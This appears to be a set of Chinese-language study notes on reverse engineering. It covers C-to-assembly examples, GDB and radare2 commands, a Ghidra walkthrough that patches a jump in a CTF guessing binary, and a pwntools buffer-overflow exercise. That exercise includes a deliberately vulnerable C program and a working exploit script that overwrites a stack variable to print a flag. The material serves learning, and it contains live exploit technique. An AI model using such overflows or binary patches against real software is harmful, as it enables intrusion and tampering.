 89c:	adrp	x0, 10000 <__FRAME_END__+0xf578>
 8a0:	ldr	x0, [x0, #4072]
 8a4:	ldr	x1, [x0]
 8a8:	str	x1, [sp, #40]
 8ac:	mov	x1, #0x0                   	// #0
   int n, i, sum = 1;
 8b0:	mov	w0, #0x1                   	// #1
 8b4:	str	w0, [sp, #36]
   printf("Enter a positive integer: ");
 8b8:	adrp	x0, 0 <__abi_tag-0x278>
 8bc:	add	x0, x0, #0x970
 8c0:	bl	750 <printf@plt>
   scanf("%d", &n);
 8c4:	add	x0, sp, #0x1c
 8c8:	mov	x1, x0
 8cc:	adrp	x0, 0 <__abi_tag-0x278>
 8d0:	add	x0, x0, #0x990
 8d4:	bl	740 <__isoc99_scanf@plt>
   i = 1;
 8d8:	mov	w0, #0x1                   	// #1
 8dc:	str	w0, [sp, #32]
   do{
     sum *= i;
 8e0:	ldr	w1, [sp, #36]
 8e4:	ldr	w0, [sp, #32]
 8e8:	mul	w0, w1, w0
 8ec:	str	w0, [sp, #36]
     ++i;
 8f0:	ldr	w0, [sp, #32]
 8f4:	add	w0, w0, #0x1
 8f8:	str	w0, [sp, #32]
   } while (i <= n);
 8fc:	ldr	w0, [sp, #28]
 900:	ldr	w1, [sp, #32]
 904:	cmp	w1, w0
 908:	b.le	8e0 <main+0x4c>
   printf("Sum = %d", sum);
 90c:	ldr	w1, [sp, #36]
 910:	adrp	x0, 0 <__abi_tag-0x278>
 914:	add	x0, x0, #0x998
 918:	bl	750 <printf@plt>
   return 0;
 91c:	mov	w0, #0x0                   	// #0
}
 920:	mov	w1, w0
 924:	adrp	x0, 10000 <__FRAME_END__+0xf578>
 928:	ldr	x0, [x0, #4072]
 92c:	ldr	x3, [sp, #40]
 930:	ldr	x2, [x0]
 934:	subs	x3, x3, x2
 938:	mov	x2, #0x0                   	// #0
 93c:	b.eq	944 <main+0xb0>  // b.none
 940:	bl	710 <__stack_chk_fail@plt>
 944:	mov	w0, w1
 948:	ldp	x29, x30, [sp], #48
 94c:	ret
```

## 範例四 ( 函數 )

- c

```c++
#include <stdio.h>
int f(int z){
    int mul = 1, i = 1;
    while (i <= z){
        mul *= i;
        i++;
    };
    return mul;
}
int main(){
    int i = 9;
    printf("%d 的階乘為%d\n", i, f(i));
    return 0;
}
```

    - 編譯與執行結果

![image](https://hackmd.io/_uploads/Hy-1aCP56.png)
![image](https://hackmd.io/_uploads/H1RDp0D9p.png)

- assembly

```c++
00000000000007a8 <main>:
int main(){
 7a8:	stp	x29, x30, [sp, #-32]!
 7ac:	mov	x29, sp
    int i = 4;
 7b0:	mov	w0, #0x9                   	// #9
 7b4:	str	w0, [sp, #28]
    printf("%d \u7684\u968e\u4e58\u70ba%d\n", i, f(i));
 7b8:	ldr	w0, [sp, #28]
 7bc:	bl	754 <f>
 7c0:	mov	w2, w0
 7c4:	ldr	w1, [sp, #28]
 7c8:	adrp	x0, 0 <__abi_tag-0x278>
 7cc:	add	x0, x0, #0x800
 7d0:	bl	630 <printf@plt>
    return 0;
 7d4:	mov	w0, #0x0                   	// #0
}
 7d8:	ldp	x29, x30, [sp], #32
 7dc:	ret

```

## 範例五（swap交換）

- c

```c++
#include <stdio.h>
void swap (int a, int b);
int main (void) {
  int i = 1234, j = 4321;
  printf ("i = %d, j = %d\n" , i, j);
  swap (i, j);
  printf ("i = %d, j = %d\n" , i, j);
  return 0;
}
void swap (int a, int b) {
  printf ("互換前:a = %d, b = %d\n" , a, b);
  int temp = a;
  a = b;
  b = temp;
  printf ("互換後:a = %d, b = %d\n" , a, b);
}
```

- 編譯與執行結果![image](https://hackmd.io/_uploads/ByW_ek_56.png)
  ![image](https://hackmd.io/_uploads/BkcYey_5a.png)

- assembly

```c++
00000000000007ac <swap>:
void swap (int a, int b) {
 7ac:	stp	x29, x30, [sp, #-48]!
 7b0:	mov	x29, sp
 7b4:	str	w0, [sp, #28]
 7b8:	str	w1, [sp, #24]
  printf ("\u4e92\u63db\u524d:a = %d, b = %d\n" , a, b);
 7bc:	ldr	w2, [sp, #24]
 7c0:	ldr	w1, [sp, #28]
 7c4:	adrp	x0, 0 <__abi_tag-0x278>
 7c8:	add	x0, x0, #0x838
 7cc:	bl	630 <printf@plt>
  int temp = a;
 7d0:	ldr	w0, [sp, #28]
 7d4:	str	w0, [sp, #44]
  a = b;
 7d8:	ldr	w0, [sp, #24]
 7dc:	str	w0, [sp, #28]
  b = temp;
 7e0:	ldr	w0, [sp, #44]
 7e4:	str	w0, [sp, #24]
  printf ("\u4e92\u63db\u5f8c:a = %d, b = %d\n" , a, b);
 7e8:	ldr	w2, [sp, #24]
 7ec:	ldr	w1, [sp, #28]
 7f0:	adrp	x0, 0 <__abi_tag-0x278>
 7f4:	add	x0, x0, #0x858
 7f8:	bl	630 <printf@plt>
}
 7fc:	nop
 800:	ldp	x29, x30, [sp], #48
 804:	ret
```

## 範例六(push與pop ==>堆疊)

- c

```c++
#include <stdio.h>
int sum(int n1, int n2, int n3, int n4, int n5, int n6, int n7, int n8, int n9){
    return n1 + n2 + n3 + n4 + n5 + n6 + n7 + n8 + n9;
}
int main(){
    int result, num1 = 1, num2 = 2, num3 = 3, num4 = 4, num5 = 5, num6 = 6, num7 = 7, num8 = 8, num9 = 9;
    result = sum(num1, num2, num3, num4, num5, num6, num7, num8, num9);
    printf("sum is %d\n", result);
    return 0;
}
```

- 編譯與執行結果![image](https://hackmd.io/_uploads/rklBZJd5a.png)
  ![image](https://hackmd.io/_uploads/H1gvZJO5T.png)

- assembly!

```c++
00000000000007c4 <main>:
int main(){
 7c4:	sub	sp, sp, #0x50
 7c8:	stp	x29, x30, [sp, #16]
 7cc:	add	x29, sp, #0x10
    int result, num1 = 1, num2 = 2, num3 = 3, num4 = 4, num5 = 5, num6 = 6, num7 = 7, num8 = 8, num9 = 9;
 7d0:	mov	w0, #0x1                   	// #1
 7d4:	str	w0, [sp, #40]
 7d8:	mov	w0, #0x2                   	// #2
 7dc:	str	w0, [sp, #44]
 7e0:	mov	w0, #0x3                   	// #3
 7e4:	str	w0, [sp, #48]
 7e8:	mov	w0, #0x4                   	// #4
 7ec:	str	w0, [sp, #52]
 7f0:	mov	w0, #0x5                   	// #5
 7f4:	str	w0, [sp, #56]
 7f8:	mov	w0, #0x6                   	// #6
 7fc:	str	w0, [sp, #60]
 800:	mov	w0, #0x7                   	// #7
 804:	str	w0, [sp, #64]
 808:	mov	w0, #0x8                   	// #8
 80c:	str	w0, [sp, #68]
 810:	mov	w0, #0x9                   	// #9
 814:	str	w0, [sp, #72]
    result = sum(num1, num2, num3, num4, num5, num6, num7, num8, num9);
 818:	ldr	w0, [sp, #72]
 81c:	str	w0, [sp]
 820:	ldr	w7, [sp, #68]
 824:	ldr	w6, [sp, #64]
 828:	ldr	w5, [sp, #60]
 82c:	ldr	w4, [sp, #56]
 830:	ldr	w3, [sp, #52]
 834:	ldr	w2, [sp, #48]
 838:	ldr	w1, [sp, #44]
 83c:	ldr	w0, [sp, #40]
 840:	bl	754 <sum>
 844:	str	w0, [sp, #76]
    printf("sum is %d\n", result);
 848:	ldr	w1, [sp, #76]
 84c:	adrp	x0, 0 <__abi_tag-0x278>
 850:	add	x0, x0, #0x888
 854:	bl	630 <printf@plt>
    return 0;
 858:	mov	w0, #0x0                   	// #0
}
 85c:	ldp	x29, x30, [sp, #16]
 860:	add	sp, sp, #0x50
 864:	ret
```

## 範例七:遞迴函數

- c

```c++
#include <stdio.h>
 double f(unsigned int i){
   if(i <= 1)
      return 1;
   else   return i * f(i - 1);
}
int main(){
    int i = 14;
    printf("%d 的階乘為%f\n", i, f(i));
    return 0;
}
```

    - 編譯與執行結果![image](https://hackmd.io/_uploads/Syygfk_9a.png)

![image](https://hackmd.io/_uploads/rk8Bzku5a.png)

- assembly

```c++
000000000000079c <main>:
int main(){
 79c:	stp	x29, x30, [sp, #-32]!
 7a0:	mov	x29, sp
    int i = 14;
 7a4:	mov	w0, #0xe                   	// #14
 7a8:	str	w0, [sp, #28]
    printf("%d \u7684\u968e\u4e58\u70ba%f\n", i, f(i));
 7ac:	ldr	w0, [sp, #28]
 7b0:	bl	754 <f>
 7b4:	ldr	w1, [sp, #28]
 7b8:	adrp	x0, 0 <__abi_tag-0x278>
 7bc:	add	x0, x0, #0x7f0
 7c0:	bl	630 <printf@plt>
    return 0;
 7c4:	mov	w0, #0x0                   	// #0
}
 7c8:	ldp	x29, x30, [sp], #32
 7cc:	ret
```

---

# GDB

### 安裝peda

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

### 指令說明 來源==>[連結](https://ithelp.ithome.com.tw/articles/10257294)

1.  `help ( h )`：顯示指令簡短說明。例：help breakpoint
2.  `file`：開啟檔案。等同於 gdb filename
3.  `run` ( r )：執行程式，或是從頭再執行程式。
4.  `kill`：中止程式的執行。
5.  `backtrace ( bt )`：顯示程式呼叫的堆疊(stack)。。會顯示出上層所有的 frame 的簡略資訊。
6.  `print ( p )`：印出變數內容。例：print i，印出變數 i 的內容。
7.  `list ( l )`：印出程式碼。若在編譯時沒有加上 -g 參數，list 指令將無作用。
8.  `whatis`：印出變數的型態。例： whatis i，印出變數 i 的型態。
9.  `breakpoint (b, bre, break)`：設定中斷點
    使用 info breakpoint (info b) 來查看已設定了哪些中斷點。
    在程式被中斷後，使用 info line 來查看正停在哪一行。
10. `continue (c, cont)`：繼續執行。和 breakpoint 搭配使用。
11. `frame`：顯示正在執行的行數、副程式名稱、及其所傳送的參數等等 frame 資訊。
    frame 2：看到 #2，也就是上上一層的 frame 的資訊。
12. `next ( n )`：單步執行，但遇到函式時會將呼叫的函式作為一個語句執行。
13. `step ( s )`：單步執行。但遇到函式時會進入呼叫的函式執行。
14. `up`：直接回到上一層的 frame，並顯示其 stack 資訊，如進入點及傳入的參數等。
15. `up 2`：直接回到上三層的 frame，並顯示其 stack 資訊。
16. `down`：直接跳到下一層的 frame，並顯示其 stack 資訊。
    必須使用 up 回到上層的 frame 後，才能用 down 回到該層來。
17. `info`：顯示一些特定的資訊。如： info break，顯示中斷點，
    info share，顯示共享函式庫資訊。
18. `disable`：暫時關閉某個 breakpoint 或 display 之功能。
19. `enable`：將被 disable 暫時關閉的功能再啟用。
20. `clear/delete`：刪除某個 breakpoint。
21. `attach PID`：載入已執行中的程式以進行除錯。其中的 PID 可由 ps 指令取得。
22. `detach PID`：釋放已 attach 的程式。
23. `shell`：執行 Shell 指令。如：shell ls，呼叫 sh 以執行 ls 指令。
24. `quit`：離開 gdb。或是按下 Ctrl+C 也行。
25. 按下`Enter`：直接執行上個指令

### 示例

```c++
//PLAYGROUND.c
#include <stdio.h>
void swap (int a, int b);
int main (void) {
  int i = 1234, j = 4321;
  printf ("i = %d, j = %d\n" , i, j);
  swap (i, j);
  printf ("i = %d, j = %d\n" , i, j);
  return 0;
}
void swap (int a, int b) {
  printf ("互換前:a = %d, b = %d\n" , a, b);
  int temp = a;
  a = b;
  b = temp;
  printf ("互換後:a = %d, b = %d\n" , a, b);
}
```

- 輸入指令`gdb ./gdb_example`![image](https://hackmd.io/_uploads/rJuVxG_ca.png)
- 當我們將第7行終止，則交換不會產生
  - 輸入`b 7`後運行，`r`為運行(run) ![image](https://hackmd.io/_uploads/BkDZGf_cT.png)

---

# radare2技術實戰

## r2用法

### 1\. 在 Radare2 中打開檔案

`r2 adder`

### 2\. 分析檔案

`aaa #分析所有`

### 3\. 列出函數

`afl          # 列出所有函數`

### 4\. 反組譯和分析函數

`pdf @ main   # 反組譯 main 函數`

### 5\. 使用視覺模式進行更好的分析

`s main       # 移動到 main 函數
V            # 進入視覺模式`

- 在視覺模式中，使用箭頭鍵或 HJKL 進行導航。
- 按 `?` 查看鍵綁定的幫助。

### 6\. 退出 Radare2

`q            # 退出 Radare2`

### 7\. 執行外部指令（例如 Python）

`!python3     # 開啟 Python3 shell`

- 您可以使用`!` 來執行外部指令(例如 `!ls`)
- **注意**：
  - 使用 `pd` 和 `pd $n_line` 來打印反彙編的指令。
  - 使用 `s $function_name` 或 `s $address` 來移動到特定的地址或函數。
  - Radare2 有三種模式：CLI、Hex Mode 和 Visual Mode。

---

## 範例練習1 ==> RE/adder

- 當我們正常執行時，該執行檔讓我猜3個數字，可是我沒猜到![image](https://hackmd.io/_uploads/H1LuCG_qT.png)

- 輸入`r2 add`,再輸入`aaa`進行深入分析,為了找到`main`![image](https://hackmd.io/_uploads/BJrh7m_qp.png)
  ![image](https://hackmd.io/_uploads/ryNEW7dqa.png)
- 輸入`pdf @ main`逆向回去![image](https://hackmd.io/_uploads/rk-CQXu56.png)
- 要進入visual模式，先找到`main`函式，使用`s mian`(s for seek),再輸入`VV`進入visual模式![image](https://hackmd.io/_uploads/BJiNwXdca.png)
  ![image](https://hackmd.io/_uploads/BJ0sPQO9a.png)
- 分析ture or false 找尋關鍵部分，如圖，該提顯示為1337![image](https://hackmd.io/_uploads/rJWdjmO5a.png)
- 確實有成功![image](https://hackmd.io/_uploads/rJbmhQd5p.png)

---

## 範例練習2 ==> RE/LuckyGuess

### 安裝

- 由於要先裝java的sdk，輸入:`sudo apt-get install -y openjdk-17-jdk`
- 確認java版本![image](https://hackmd.io/_uploads/rJIdkHucp.png)
- 輸入`wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0.1_build/ghidra_11.0.1_PUBLIC_20240130.zip
`將檔案下載下來
- 解壓縮檔案`unzip ghidra_11.0.1_PUBLIC_20240130.zip `
- 開始執行`./ghidraRun`

### 逆向

- 將LuckyGuess丟進去然後開始分析![image](https://hackmd.io/_uploads/HyyFdSd5p.png)
- 找到text執行檔
  ![image](https://hackmd.io/_uploads/HkcQFrdcT.png)
  - 呈現這樣![image](https://hackmd.io/_uploads/BkbYFBu5a.png)
- 然後要到function裡找到main函數![image](https://hackmd.io/_uploads/HkzJ5SO56.png)
  - 挖出來後長這樣

```c++
undefined8 main(void)
{
  time_t tVar1;
  char *pcVar2;
  basic_ostream *pbVar3;
  long lVar4;
  undefined8 *puVar5;
  undefined8 *puVar6;
  byte bVar7;
  int local_a8;
  int local_a4;
  uint local_a0;
  int local_9c;
  undefined8 local_98 [18];

  bVar7 = 0;
  primp();
  puVar5 = &DAT_00400d80;
  puVar6 = local_98;
  for (lVar4 = 0x11; lVar4 != 0; lVar4 = lVar4 + -1) {
    *puVar6 = *puVar5;
    puVar5 = puVar5 + (ulong)bVar7 * -2 + 1;
    puVar6 = puVar6 + (ulong)bVar7 * -2 + 1;
  }
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_9c = rand();
  local_9c = local_9c % 0x4000000;
  local_a4 = 0;
  local_a8 = 0;
  while( true ) {
    if (0x16 < local_a4) {
      local_a4 = local_a4 + 1;
      pbVar3 = std::operator<<((basic_ostream *)std::cout,"no dice.");
      std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar3,std::endl<>);
      return 0;
    }
    local_a4 = local_a4 + 1;
    std::operator<<((basic_ostream *)std::cout,"Guess? ");
    std::basic_istream<>::operator>>((basic_istream<> *)std::cin,&local_a8);
    if (local_a8 == local_9c) break;  //==這邊可以直接跳出迴圈==
    if (local_a8 < local_9c) {
      pcVar2 = "lo";
    }
    else {
      pcVar2 = "hi";
    }
    pbVar3 = std::operator<<((basic_ostream *)std::cout,pcVar2);
    std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar3,std::endl<>);
  }
  for (local_a0 = 0; local_a0 < 0x22; local_a0 = local_a0 + 1) {
    std::operator<<((basic_ostream *)std::cout,
                    (byte)*(undefined4 *)(c610 + (long)(int)local_a0 * 4) ^
                    (byte)*(undefined4 *)((long)local_98 + (long)(int)local_a0 * 4));
  }
  return 1;
}
```

- 知道邏輯要跳脫while，用gdb![image](https://hackmd.io/_uploads/ryEDjBd96.png)
- 先反組譯![image](https://hackmd.io/_uploads/B1c2JI_qa.png)

```=
0x0000000000400af8 <+0>:	push   rbp
0x0000000000400af9 <+1>:	mov    rbp,rsp
0x0000000000400afc <+4>:	sub    rsp,0xa0
0x0000000000400b03 <+11>:	call   0x400a7e <_Z5primpv>
0x0000000000400b08 <+16>:	lea    rdx,[rbp-0x90]
0x0000000000400b0f <+23>:	mov    esi,0x400d80
0x0000000000400b14 <+28>:	mov    eax,0x11
0x0000000000400b19 <+33>:	mov    rdi,rdx
0x0000000000400b1c <+36>:	mov    rcx,rax
0x0000000000400b1f <+39>:	rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
0x0000000000400b22 <+42>:	mov    edi,0x0
0x0000000000400b27 <+47>:	call   0x400930 <time@plt>
0x0000000000400b2c <+52>:	mov    edi,eax
0x0000000000400b2e <+54>:	call   0x4008f0 <srand@plt>
0x0000000000400b33 <+59>:	call   0x400920 <rand@plt>
0x0000000000400b38 <+64>:	cdq
0x0000000000400b39 <+65>:	shr    edx,0x6
0x0000000000400b3c <+68>:	add    eax,edx
0x0000000000400b3e <+70>:	and    eax,0x3ffffff
0x0000000000400b43 <+75>:	sub    eax,edx
0x0000000000400b45 <+77>:	mov    DWORD PTR [rbp-0x94],eax
0x0000000000400b4b <+83>:	mov    DWORD PTR [rbp-0x9c],0x0
0x0000000000400b55 <+93>:	mov    DWORD PTR [rbp-0xa0],0x0
0x0000000000400b5f <+103>:	jmp    0x400c27 <main+303>
0x0000000000400b64 <+108>:	mov    esi,0x400d60
0x0000000000400b69 <+113>:	mov    edi,0x6021c0
0x0000000000400b6e <+118>:	call   0x4008d0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
0x0000000000400b73 <+123>:	lea    rax,[rbp-0xa0]
0x0000000000400b7a <+130>:	mov    rsi,rax
0x0000000000400b7d <+133>:	mov    edi,0x6020a0
0x0000000000400b82 <+138>:	call   0x4008e0 <_ZNSirsERi@plt>
0x0000000000400b87 <+143>:	mov    eax,DWORD PTR [rbp-0xa0]
0x0000000000400b8d <+149>:	cmp    eax,DWORD PTR [rbp-0x94]
0x0000000000400b93 <+155>:	jne    0x400bf3 <main+251> //提供了變數地址
0x0000000000400b95 <+157>:	mov    DWORD PTR [rbp-0x98],0x0
0x0000000000400b9f <+167>:	jmp    0x400bd9 <main+225>
0x0000000000400ba1 <+169>:	mov    eax,DWORD PTR [rbp-0x98]
0x0000000000400ba7 <+175>:	cdqe
0x0000000000400ba9 <+177>:	mov    eax,DWORD PTR [rbp+rax*4-0x90]
0x0000000000400bb0 <+184>:	mov    edx,eax
0x0000000000400bb2 <+186>:	mov    eax,DWORD PTR [rbp-0x98]
0x0000000000400bb8 <+192>:	cdqe
0x0000000000400bba <+194>:	mov    eax,DWORD PTR [rax*4+0x602300]
0x0000000000400bc1 <+201>:	xor    eax,edx
0x0000000000400bc3 <+203>:	movsx  eax,al
0x0000000000400bc6 <+206>:	mov    esi,eax
0x0000000000400bc8 <+208>:	mov    edi,0x6021c0
0x0000000000400bcd <+213>:	call   0x4008b0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_c@plt>
0x0000000000400bd2 <+218>:	add    DWORD PTR [rbp-0x98],0x1
0x0000000000400bd9 <+225>:	mov    eax,DWORD PTR [rbp-0x98]
0x0000000000400bdf <+231>:	movsxd rdx,eax
0x0000000000400be2 <+234>:	mov    eax,0x22
0x0000000000400be7 <+239>:	cmp    rdx,rax
0x0000000000400bea <+242>:	jb     0x400ba1 <main+169>
0x0000000000400bec <+244>:	mov    eax,0x1
0x0000000000400bf1 <+249>:	jmp    0x400c65 <main+365>
0x0000000000400bf3 <+251>:	mov    eax,DWORD PTR [rbp-0xa0]
0x0000000000400bf9 <+257>:	cmp    eax,DWORD PTR [rbp-0x94]
0x0000000000400bff <+263>:	jge    0x400c08 <main+272>
0x0000000000400c01 <+265>:	mov    eax,0x400d68
0x0000000000400c06 <+270>:	jmp    0x400c0d <main+277>
0x0000000000400c08 <+272>:	mov    eax,0x400d6b
0x0000000000400c0d <+277>:	mov    rsi,rax
0x0000000000400c10 <+280>:	mov    edi,0x6021c0
0x0000000000400c15 <+285>:	call   0x4008d0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
0x0000000000400c1a <+290>:	mov    esi,0x400910
0x0000000000400c1f <+295>:	mov    rdi,rax
0x0000000000400c22 <+298>:	call   0x400900 <_ZNSolsEPFRSoS_E@plt>
0x0000000000400c27 <+303>:	mov    eax,DWORD PTR [rbp-0x9c]
0x0000000000400c2d <+309>:	lea    edx,[rax+0x1]
0x0000000000400c30 <+312>:	mov    DWORD PTR [rbp-0x9c],edx
0x0000000000400c36 <+318>:	cmp    eax,0x16
0x0000000000400c39 <+321>:	setle  al
0x0000000000400c3c <+324>:	test   al,al
0x0000000000400c3e <+326>:	jne    0x400b64 <main+108>
0x0000000000400c44 <+332>:	mov    esi,0x400d6e
0x0000000000400c49 <+337>:	mov    edi,0x6021c0
0x0000000000400c4e <+342>:	call   0x4008d0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
0x0000000000400c53 <+347>:	mov    esi,0x400910
0x0000000000400c58 <+352>:	mov    rdi,rax
0x0000000000400c5b <+355>:	call   0x400900 <_ZNSolsEPFRSoS_E@plt>
0x0000000000400c60 <+360>:	mov    eax,0x0
0x0000000000400c65 <+365>:	leave
0x0000000000400c66 <+366>:	ret
```

- 將
  {=> 0x75} 為nop指令 {=> 0x90}![image](https://hackmd.io/_uploads/Hkgv-Id5T.png)

---

# PWN

- 擷取提示![image](https://hackmd.io/_uploads/SkT8aI_9T.png)

### pwntools 常用技術 ==>[出處](https://github.com/MyFirstSecurity2020/ProgSec/blob/main/4-5.md)

- 載入pwntools套件 ==> from pwn import \* # 可將所有子模組和一些常用的系統函數庫導入
- 建立與程式連結(connection)
  - 與遠端程式(使用remote())
    - conn = remote('ip_address', port_num)
    - conn = remote('173.4.5.1', 8888)
  - 與本地端程式(使用process())==> conn = process('./pwn1')
- 接收資料 receive
  - recv(numb=1096, timeoutxtdefault)：接收指定位元組數的資料
  - recvall()：接收資料直到 EOF
  - recvline(keepends=True)：接收一行，可選擇是否保留行尾的 \\n
  - recvlines(N):接收 N行輸出
  - recvrepeat(timeoutxtdefault)：接收資料直到 EOF(END of FILE) 或 timeout
  - recvuntil(delims, timeoutxtdefault)：接收資料直到 delims 出現
- 傳資料
  - send(data)：發送資料
  - sendline(data)：發送一行，預設會在行尾加 \\n
  - sendlineafter(delims, 要送出的資料)：從 delims 出現後,將要送出的資料 傳送給程式
- 互動 ==\> conn.interactive()
  - 可同時對遠端系統讀寫資料
  - 相當於回到 shell 模式進行互動
  - 在取得 shell 之後調用
- [pwntools工具的使用](https://blog.csdn.net/A951860555/article/details/110990925)

### 範例 /DATA202401/pwn

- c

```c++
//pass.c
#include"stdio.h"
#include"stdlib.h"
int main(){
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  int token = 1234;
  char key[16];
  printf("Billy left his key in the locked room.\n");
  printf("However, he forgot the token of the room.\n");
  printf("Do you know what's the key?");
  read(0, key, 40);
  if((int)token == 0xdeadbeef){
    printf("Door open. OwO\n");
    system("cat ./flag");
  }else{
    printf("Cannot open door. QwQ\n");
  }
  return 0;
}
```

- 輸入指令
  - `gedit pass.c`
  - `gcc -fno-stack-protector -z execstack pass.c -o pass -no-pie`
  - `socat TCP-LISTEN:21004,fork EXEC:'./pass'`

```python=
#pass.py
from pwn import *
r = process('./pass')
r = remote('localhost',21004)
payload = b'B'*28
r.sendline(payload+ p64(0xdeadbeef))
r.interactive()
```

- py![image](https://hackmd.io/_uploads/r1R8dvOca.png)

- flag![image](https://hackmd.io/_uploads/HkxG9Duc6.png)

- 用gdb看一下 ==disabled!==![image](https://hackmd.io/_uploads/rJhAcwucT.png)

- 用radare2去看main![image](https://hackmd.io/_uploads/S19Ujwucp.png)
  - 知道下面的是哪邊是false就可以去用地址了![image](https://hackmd.io/_uploads/HyzTjvu5p.png)
    - 其中的變數![image](https://hackmd.io/_uploads/SyrXnDO9T.png)
    - 相互compare![image](https://hackmd.io/_uploads/SyRrnD_5a.png)

---
